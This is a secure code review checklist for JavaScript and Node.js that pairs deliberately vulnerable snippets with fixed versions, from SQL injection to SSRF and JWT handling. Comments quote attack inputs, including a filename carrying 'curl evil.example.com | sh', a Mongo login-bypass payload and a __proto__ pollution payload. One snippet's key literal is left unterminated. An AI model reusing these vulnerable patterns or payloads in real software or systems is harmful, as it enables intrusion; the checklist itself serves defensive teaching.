# JavaScript / Node.js Secure Code Review Checklist

Language-specific checklist for reviewing JavaScript and TypeScript code. Each section has **what to look for**, a **vulnerable** snippet, and the **secure** version. Use alongside the generic review process guide in the parent folder.

Targeted at Node.js 20+ and the mainstream ecosystem: Express, Fastify, Next.js, Koa, MongoDB/Mongoose, `mysql2`, `pg`, `jsonwebtoken`, `axios`, `node-fetch`, `crypto`. TypeScript-first where applicable — type checks are not security controls but they catch a meaningful fraction of passthrough bugs.

---

## 1. SQL Injection

**What to look for.** Template literals or `+` string concatenation being used to build a SQL query. Use of `query()` with an interpolated string. ORMs used correctly in most places with a single `raw()` escape hatch that takes user input.

**Vulnerable.**
```javascript
// mysql2 — template literals interpolate attacker input directly into SQL.
async function getUserByEmail(conn, email) {
  const [rows] = await conn.query(
    `SELECT id, email, role FROM users WHERE email = '${email}'`
  );
  return rows[0];
}
```

**Secure.**
```javascript
// Parameterized query with placeholders — driver escapes inputs safely.
async function getUserByEmail(conn, email) {
  const [rows] = await conn.execute(
    "SELECT id, email, role FROM users WHERE email = ?",
    [email]
  );
  return rows[0];
}

// Or, preferred: use a query builder or ORM that parameterizes by default.
// Knex: db("users").where({ email }).first();
// Prisma: prisma.user.findUnique({ where: { email } });
```

---

## 2. NoSQL Injection (MongoDB Operator Injection)

**What to look for.** Any Mongo query that takes an object from `req.body` or `req.query` and spreads it into a `find()`, `findOne()`, or `update()`. This is the most common NoSQL injection pattern: if the attacker can submit `{"$ne": null}` as the password, a simple auth check turns into "find any user."

**Vulnerable.**
```javascript
// Express + Mongoose. Attacker posts { "email": "a@b.com", "password": { "$ne": null } }
// and logs in as a@b.com without knowing the password.
app.post("/login", async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password,
  });
  if (!user) return res.status(401).json({ error: "invalid credentials" });
  res.json({ token: issueToken(user) });
});
```

**Secure.**
```javascript
const mongoSanitize = require("express-mongo-sanitize");
const { z } = require("zod");

// 1. App-wide middleware: strips keys starting with $ or containing . from
//    req.body / req.query / req.params before handlers run.
app.use(mongoSanitize({ replaceWith: "_" }));

// 2. Schema validation at the handler — type + shape are both enforced.
const LoginSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(1).max(256),
});

app.post("/login", async (req, res) => {
  const parsed = LoginSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid request" });
  }
  const { email, password } = parsed.data;

  // Look up by email only, verify the password hash explicitly.
  const user = await User.findOne({ email }).select("+passwordHash");
  if (!user || !(await argon2.verify(user.passwordHash, password))) {
    return res.status(401).json({ error: "invalid credentials" });
  }
  res.json({ token: issueToken(user) });
});
```

---

## 3. Command Injection

**What to look for.** `child_process.exec`, `child_process.execSync`, or any `shell: true` option with user-controlled input. Template strings being passed to shell execution.

**Vulnerable.**
```javascript
const { exec } = require("child_process");

// Attacker supplies filename like: "photo.png; curl evil.example.com | sh"
function convertImage(filename, cb) {
  exec(`convert ${filename} output.jpg`, cb);
}
```

**Secure.**
```javascript
const { execFile } = require("child_process");
const path = require("path");

const UPLOADS_DIR = path.resolve("/srv/uploads");

function convertImage(filename, cb) {
  // Resolve + verify path stays inside UPLOADS_DIR.
  const resolved = path.resolve(UPLOADS_DIR, filename);
  if (!resolved.startsWith(UPLOADS_DIR + path.sep)) {
    return cb(new Error("path traversal"));
  }

  // execFile — no shell, arguments passed as an array.
  execFile(
    "convert",
    [resolved, "output.jpg"],
    { timeout: 30_000 },
    cb
  );
}
```

---

## 4. Prototype Pollution

**What to look for.** Any recursive merge, deep-clone, or "assign" function that walks keys from an untrusted object. `lodash.merge`, custom merges, `Object.assign` applied recursively. The key names `__proto__`, `constructor`, and `prototype` in untrusted input.

**Vulnerable.**
```javascript
// Recursive merge that walks keys from user input.
// Payload: { "__proto__": { "isAdmin": true } }
// After this call, EVERY object has .isAdmin === true.
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

app.post("/preferences", (req, res) => {
  const prefs = merge({ theme: "light" }, req.body); // pollutes prototype
  req.user.preferences = prefs;
  res.json({ ok: true });
});
```

**Secure.**
```javascript
// Option A — null-prototype objects + allowlist of keys.
const ALLOWED_PREF_KEYS = new Set(["theme", "density", "language"]);

function safeMergePrefs(base, update) {
  const out = Object.create(null);
  for (const key of ALLOWED_PREF_KEYS) {
    if (Object.prototype.hasOwnProperty.call(base, key)) out[key] = base[key];
  }
  for (const key of Object.keys(update)) {
    if (!ALLOWED_PREF_KEYS.has(key)) continue;          // drop unknown keys
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;
    out[key] = update[key];                              // flat assignment
  }
  return out;
}

// Option B — validate input with a schema, never merge raw.
const PrefsSchema = z.object({
  theme: z.enum(["light", "dark"]).optional(),
  density: z.enum(["compact", "comfortable"]).optional(),
  language: z.string().regex(/^[a-z]{2}(-[A-Z]{2})?$/).optional(),
}).strict(); // .strict() rejects any extra keys, including __proto__

app.post("/preferences", (req, res) => {
  const parsed = PrefsSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid prefs" });
  req.user.preferences = { ...req.user.preferences, ...parsed.data };
  res.json({ ok: true });
});
```

Also consider running Node with `--disable-proto=delete` (Node 20+) to remove `__proto__` setter entirely as a defense-in-depth.

---

## 5. Insecure Deserialization

**What to look for.** `eval()` on any input. `new Function()` built from strings. `JSON.parse` with a dangerous `reviver` function. `node-serialize` (vulnerable by design). `vm` or `vm2` usage on untrusted input. YAML parsers using unsafe tags.

**Vulnerable.**
```javascript
// eval on request body — arbitrary code execution.
app.post("/calculate", (req, res) => {
  const result = eval(req.body.expression);
  res.json({ result });
});

// A reviver that instantiates classes from JSON — weaponizable.
function revive(key, value) {
  if (value && value.__type) {
    return new (global[value.__type])(value.data);
  }
  return value;
}
const parsed = JSON.parse(req.body.payload, revive);
```

**Secure.**
```javascript
// Evaluate a constrained expression language, never eval.
const { evaluate } = require("mathjs");

app.post("/calculate", (req, res) => {
  const ExprSchema = z.string().regex(/^[0-9+\-*/().\s]{1,256}$/);
  const parsed = ExprSchema.safeParse(req.body.expression);
  if (!parsed.success) return res.status(400).json({ error: "invalid expression" });

  try {
    const result = evaluate(parsed.data);
    if (!Number.isFinite(result)) throw new Error("bad result");
    res.json({ result });
  } catch {
    res.status(400).json({ error: "invalid expression" });
  }
});

// JSON.parse with no reviver + schema validation after.
const parsed = JSON.parse(req.body.payload);      // no reviver
const result = PayloadSchema.parse(parsed);       // enforce shape
```

---

## 6. Hardcoded Secrets

**What to look for.** Literal strings that look like API keys, tokens, or passwords. Fallback defaults in `process.env.X || "real-looking-string"`. Connection strings with embedded credentials. `.env` files committed to git with real values.

**Vulnerable.**
```javascript
// Credentials in source — lives in git history forever.
const STRIPE_SECRET = "sk_live_EXAMPLE_NOT_A_REAL_KEY
const DB_URL = "postgres://admin:S3cretP@prod-db.internal:5432/app";

function charge(amount, token) {
  return stripe(STRIPE_SECRET).charges.create({ amount, source: token });
}
```

**Secure.**
```javascript
// config.js — one module that loads + validates env, fails fast.
const { z } = require("zod");
require("dotenv-safe").config({ allowEmptyValues: false });

const EnvSchema = z.object({
  NODE_ENV: z.enum(["development", "test", "production"]),
  STRIPE_SECRET: z.string().startsWith("sk_").min(20),
  DATABASE_URL: z.string().url(),
});

const env = EnvSchema.parse(process.env);   // throws loudly on startup if missing
module.exports = { env };
```
```javascript
// charge.js
const { env } = require("./config");
const Stripe = require("stripe");
const stripe = new Stripe(env.STRIPE_SECRET);

async function charge(amount, token) {
  return stripe.charges.create({ amount, source: token });
}
```

For production, the env vars should be sourced from a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager) at container start — not committed to a `.env` file.

---

## 7. Weak Cryptography

**What to look for.** `Math.random()` used for tokens, session IDs, CSRF tokens, or anything security-relevant. `crypto.createHash("md5")` or `"sha1"` being used for password hashing or anything requiring collision resistance. Custom MAC construction. AES in CBC mode without an authenticated MAC.

**Vulnerable.**
```javascript
const crypto = require("crypto");

// Math.random is a PRNG seeded at startup — the state is recoverable.
function generateResetToken() {
  return Math.random().toString(36).slice(2);
}

// SHA-1 + no salt + fast hash — crackable in seconds on a consumer GPU.
function hashPassword(password) {
  return crypto.createHash("sha1").update(password).digest("hex");
}
```

**Secure.**
```javascript
const crypto = require("crypto");
const argon2 = require("argon2");

// 32 bytes → 256 bits of entropy, URL-safe.
function generateResetToken() {
  return crypto.randomBytes(32).toString("base64url");
}

// Argon2id with tuned parameters — revisit annually as hardware gets faster.
async function hashPassword(password) {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 2 ** 16,   // 64 MiB
    timeCost: 3,
    parallelism: 4,
  });
}

async function verifyPassword(storedHash, password) {
  try {
    return await argon2.verify(storedHash, password);
  } catch {
    return false;
  }
}
```

---

## 8. Cross-Site Scripting (XSS)

**What to look for.** `innerHTML` assignments from any source that is not a constant literal. `document.write`. React's `dangerouslySetInnerHTML`. Vue's `v-html`. Template strings injected into the DOM without encoding. Markdown-to-HTML conversion without a sanitizer.

**Vulnerable.**
```javascript
// User-controlled string rendered as HTML — stored XSS.
function renderComment(comment) {
  document.getElementById("comment").innerHTML = comment.body;
}

// React — same problem.
function Comment({ body }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}
```

**Secure.**
```javascript
// Plain text output — browser does not parse as HTML.
function renderComment(comment) {
  document.getElementById("comment").textContent = comment.body;
}

// React — the default rendering is already safe.
function Comment({ body }) {
  return <div>{body}</div>;
}

// If the content is intentionally HTML (e.g., user-authored markdown),
// sanitize it first with a strict allowlist.
import DOMPurify from "dompurify";

function MarkdownComment({ rawHtml }) {
  const clean = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ["p", "a", "em", "strong", "code", "pre", "ul", "ol", "li"],
    ALLOWED_ATTR: ["href", "title"],
    ALLOWED_URI_REGEXP: /^(https?:|mailto:)/i,
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Pair output encoding with a strict Content-Security-Policy header. CSP is defense-in-depth against XSS that escapes encoding; encoding is the primary control.

---

## 9. Server-Side Request Forgery (SSRF)

**What to look for.** `axios.get(url)` or `fetch(url)` where `url` is constructed from user input. URL preview features, image proxies, webhook delivery, "import from URL" features.

**Vulnerable.**
```javascript
const axios = require("axios");

app.post("/preview", async (req, res) => {
  // Attacker supplies http://169.254.169.254/... and exfiltrates IAM creds.
  const response = await axios.get(req.body.url);
  res.send(response.data);
});
```

**Secure.**
```javascript
const axios = require("axios");
const dns = require("dns/promises");
const net = require("net");
const { URL } = require("url");

const ALLOWED_SCHEMES = new Set(["https:"]);
const ALLOWED_PORTS = new Set([443]);

function isPrivateIp(ip) {
  const parsed = net.isIP(ip);
  if (!parsed) return true; // refuse if we cannot parse

  const [a, b] = ip.split(".").map(Number);
  if (parsed === 4) {
    if (a === 10) return true;
    if (a === 127) return true;
    if (a === 169 && b === 254) return true;           // AWS IMDS, GCP MDS
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 0) return true;
  }
  // IPv6 analogues: ::1, fc00::/7, fe80::/10, ::ffff:10.0.0.0, etc.
  // Use a dedicated IP-range library in production (ip-address, netmask).
  return false;
}

async function resolveToPublicIp(hostname) {
  const addrs = await dns.lookup(hostname, { all: true });
  const ips = addrs.map((a) => a.address);
  if (ips.some(isPrivateIp)) throw new Error("private address");
  return ips[0];
}

app.post("/preview", async (req, res) => {
  let parsed;
  try { parsed = new URL(req.body.url); }
  catch { return res.status(400).json({ error: "invalid url" }); }

  if (!ALLOWED_SCHEMES.has(parsed.protocol)) {
    return res.status(400).json({ error: "scheme not allowed" });
  }
  const port = parsed.port ? Number(parsed.port) : 443;
  if (!ALLOWED_PORTS.has(port)) {
    return res.status(400).json({ error: "port not allowed" });
  }

  try { await resolveToPublicIp(parsed.hostname); }
  catch { return res.status(400).json({ error: "target not permitted" }); }

  const response = await axios.get(parsed.toString(), {
    timeout: 5_000,
    maxContentLength: 2 * 1024 * 1024,
    maxRedirects: 0,                      // redirects can bypass the check
    validateStatus: (s) => s >= 200 && s < 300,
  });
  res.send(response.data);
});
```

For production, run egress through a dedicated proxy or a Node HTTP agent that enforces the check at connect time — which closes the DNS rebinding window that an application-layer check cannot close on its own.

---

## 10. Insecure JWT Handling

**What to look for.** `jwt.verify(token, secret)` with no explicit `algorithms` option. `jwt.decode()` used as a validation step (it does not validate). Missing issuer/audience checks. JWTs verified with a key fetched from the token's own `kid` header without validation.

**Vulnerable.**
```javascript
const jwt = require("jsonwebtoken");

// No algorithm pin → classic alg-confusion bug (CVE-2015-9235 class).
// No expiry check explicit; default is on, but brittle if options grow.
function currentUser(token) {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  return { id: decoded.sub, role: decoded.role };
}

// jwt.decode does not verify the signature at all — fatal mistake.
function unsafeCurrentUser(token) {
  const decoded = jwt.decode(token);
  return decoded; // attacker-controlled!
}
```

**Secure.**
```javascript
const jwt = require("jsonwebtoken");
const jwksClient = require("jwks-rsa");

const client = jwksClient({
  jwksUri: "https://auth.example.com/.well-known/jwks.json",
  cache: true, cacheMaxAge: 10 * 60 * 1000, rateLimit: true,
});

function getKey(header, cb) {
  // Look up the signing key by kid — but only trust kids from the JWKS.
  client.getSigningKey(header.kid, (err, key) => {
    if (err) return cb(err);
    cb(null, key.getPublicKey());
  });
}

function currentUser(token) {
  return new Promise((resolve, reject) => {
    jwt.verify(
      token,
      getKey,
      {
        algorithms: ["RS256"],                 // explicit allowlist
        issuer: "https://auth.example.com/",
        audience: "api.example.com",
        clockTolerance: 30,                    // 30s skew
      },
      (err, decoded) => {
        if (err) return reject(err);
        if (!decoded.sub) return reject(new Error("missing sub"));
        resolve({ id: decoded.sub, role: decoded.role });
      }
    );
  });
}
```

---

## 11. Express and Node-Specific

**What to look for.**

- Missing `helmet` middleware, or helmet configured but permissive.
- Permissive CORS: `origin: "*"` combined with `credentials: true` is never correct.
- No rate limiting on authentication endpoints.
- `express.json({ limit: "50mb" })` — overly generous body size limits on non-upload endpoints.
- Cookies set without `httpOnly`, `secure`, or `sameSite`.
- Error handlers that return full error objects (`res.json(err)`) — leaks stack traces and internal state.
- `app.use(express.static(...))` that exposes `node_modules`, source maps, or `.git`.

**Vulnerable.**
```javascript
const express = require("express");
const cors = require("cors");

const app = express();
app.use(express.json({ limit: "100mb" }));        // oversized
app.use(cors({ origin: "*", credentials: true })); // explicitly forbidden combo
// No helmet. No rate limiting. No CSRF. Error handler leaks stack traces.

app.post("/login", async (req, res, next) => {
  try { /* ... */ } catch (err) { res.status(500).json(err); }
});
```

**Secure.**
```javascript
const express = require("express");
const helmet = require("helmet");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const cookieParser = require("cookie-parser");

const app = express();

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
    },
  },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  crossOriginOpenerPolicy: { policy: "same-origin" },
}));

app.use(express.json({ limit: "100kb" }));
app.use(cookieParser(process.env.COOKIE_SECRET));

// Specific origins only; credentials only allowed with a specific origin list.
app.use(cors({
  origin: ["https://app.example.com"],
  credentials: true,
  methods: ["GET", "POST", "PATCH", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));

// Throttle the sensitive endpoints; the app-wide limit is larger.
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 10,
  standardHeaders: true, legacyHeaders: false,
});
app.post("/login", loginLimiter, async (req, res, next) => {
  try { /* ... */ } catch (err) { next(err); }
});

// Sessions / auth cookies — set with the right flags.
app.use((req, res, next) => {
  res.cookie("session", "...", {
    httpOnly: true, secure: true, sameSite: "lax", signed: true,
    maxAge: 60 * 60 * 1000,
  });
  next();
});

// Single error handler — sanitizes the response; logs the full error server-side.
app.use((err, req, res, next) => {
  req.log?.error({ err, reqId: req.id }, "unhandled error");
  res.status(err.status ?? 500).json({ error: "internal error", reqId: req.id });
});
```
